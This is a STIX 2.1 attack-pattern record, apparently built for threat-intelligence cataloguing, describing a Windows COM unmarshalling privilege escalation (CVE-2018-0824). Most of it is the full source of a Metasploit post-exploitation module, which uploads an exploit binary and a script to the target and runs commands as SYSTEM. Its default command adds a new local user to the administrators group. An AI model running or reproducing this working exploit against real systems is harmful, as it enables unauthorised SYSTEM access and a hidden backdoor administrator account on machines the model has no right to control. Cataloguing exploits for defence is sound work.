{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f799af6b-9141-43f4-96bb-ad993706c594",
    "created": "2024-08-14T16:33:04.625159Z",
    "modified": "2024-08-14T16:33:04.625163Z",
    "name": "Windows unmarshal post exploitation",
    "description": " This module exploits a local privilege escalation bug which exists in microsoft COM for windows when it fails to properly handle serialized objects.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/escalate/unmarshal_cmd_exec.rb",
            "external_id": "unmarshal_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/x73x61x6ex6ax61x79/UnmarshalPwn"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Version\n  #  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows unmarshal post exploitation',\n        'Description' => %q{\n          This module exploits a local privilege escalation bug which exists\n          in microsoft COM for windows when it fails to properly handle serialized objects.\n        },\n        'References' => [\n          ['CVE', '2018-0824'],\n          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824'],\n          ['URL', 'https://github.com/x73x61x6ex6ax61x79/UnmarshalPwn'],\n          ['EDB', '44906']\n        ],\n        'Author' => [\n          'Nicolas Joly', # Vulnerability discovery\n          'Matthias Kaiser', # Exploit PoC\n          'Sanjay Gondaliya', # Modified PoC\n          'Pratik Shah <pratik@notsosecure.com>' # Metasploit module\n        ],\n        'DisclosureDate' => '2018-08-05',\n        'Platform' => ['win'],\n        'Arch' => ARCH_X64,\n        'License' => MSF_LICENSE,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('COMMAND',\n                      [false, 'The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% & net localgroup administrators /add <user>).', nil]),\n        OptString.new('EXPLOIT_NAME',\n                      [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),\n        OptString.new('SCRIPT_NAME',\n                      [false, 'The filename to use for the COM script file (%RAND% by default).', nil]),\n        OptString.new('PATH',\n                      [false, 'Path to write binaries (%TEMP% by default).', nil]),\n      ]\n    )\n  end\n\n  def setup\n    super\n    validate_active_host\n    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))\n    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))\n    @exploit_name = \"#{exploit_name}.exe\" unless exploit_name.match(/\\.exe$/i)\n    @script_name = \"#{script_name}.sct\" unless script_name.match(/\\.sct$/i)\n    @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')\n    @exploit_path = \"#{temp_path}\\\\#{exploit_name}\"\n    @script_path = \"#{temp_path}\\\\#{script_name}\"\n  end\n\n  def populate_command\n    username = Rex::Text.rand_text_alpha(rand(6..13))\n    password = Rex::Text.rand_text_alpha(rand(6..13))\n    print_status(\"username = #{username}, password = #{password}\")\n    cmd_to_run = 'net user /add ' + username + ' ' + password\n    cmd_to_run += '  & net localgroup administrators /add ' + username\n    print_status(cmd_to_run)\n    return cmd_to_run\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to Run on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_remote_path(path)\n    unless directory?(path)\n      fail_with(Failure::Unreachable, \"#{path} does not exist on the target\")\n    end\n  end\n\n  def validate_target\n    if sysinfo['Architecture'] == ARCH_X86\n      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')\n    end\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win10_1803)\n      fail_with(Failure::Unknown, 'The exploit does not support this OS')\n    end\n  end\n\n  def ensure_clean_destination(path)\n    if file?(path)\n      print_status(\"#{path} already exists on the target. Deleting...\")\n      begin\n        file_rm(path)\n        print_status(\"Deleted #{path}\")\n      rescue Rex::Post::Meterpreter::RequestError => e\n        elog(e)\n        print_error(\"Unable to delete #{path}\")\n      end\n    end\n  end\n\n  def upload_exploit\n    local_exploit_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'UnmarshalPwn.exe')\n    upload_file(exploit_path, local_exploit_path)\n    print_status(\"Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}\")\n  end\n\n  def upload_script(cmd_to_run)\n    vprint_status(\"Creating the sct file with command #{cmd_to_run}\")\n    local_script_template_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'script_template')\n    script_template_data = ::IO.read(local_script_template_path)\n    vprint_status(\"script_template_data.length =  #{script_template_data.length}\")\n    full_command = 'cmd.exe /c ' + cmd_to_run\n    full_command = full_command\n    script_data = script_template_data.sub!('SCRIPTED_COMMAND', full_command)\n    if script_data.nil?\n      fail_with(Failure::BadConfig, 'Failed to substitute command in script_template')\n    end\n    vprint_status(\"Writing #{script_data.length} bytes to #{script_path} to target\")\n    write_file(script_path, script_data)\n    vprint_status('Script uploaded successfully')\n  end\n\n  def run\n    if datastore['COMMAND'].nil?\n      cmd_to_run = populate_command\n    else\n      cmd_to_run = datastore['COMMAND']\n    end\n    print_status(\"exploit path is: #{exploit_path}\")\n    print_status(\"script path is: #{script_path}\")\n    print_status(\"command is: #{cmd_to_run}\")\n    begin\n      validate_active_host\n      validate_target\n      validate_remote_path(temp_path)\n      ensure_clean_destination(exploit_path)\n      ensure_clean_destination(script_path)\n      vprint_status(\"Uploading Script to #{script_path}\")\n      upload_script(cmd_to_run)\n      vprint_status(\"Uploading Exploit to #{exploit_path}\")\n      upload_exploit\n      vprint_status('Launching Exploit...')\n      command_output = cmd_exec(exploit_path + ' ' + script_path)\n      vprint_status(command_output)\n      print_good('Exploit Completed')\n      ensure_clean_destination(exploit_path)\n      ensure_clean_destination(script_path)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      elog('Command failed, cleaning up', error: e)\n      print_good('Command failed, cleaning up')\n      print_error(e.message)\n      ensure_clean_destination(exploit_path)\n      ensure_clean_destination(script_path)\n    end\n  end\n  attr_reader :exploit_name, :script_name, :temp_path, :exploit_path, :script_path\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-08-05",
    "x_mitre_platforms": [
        "['win']"
    ]
}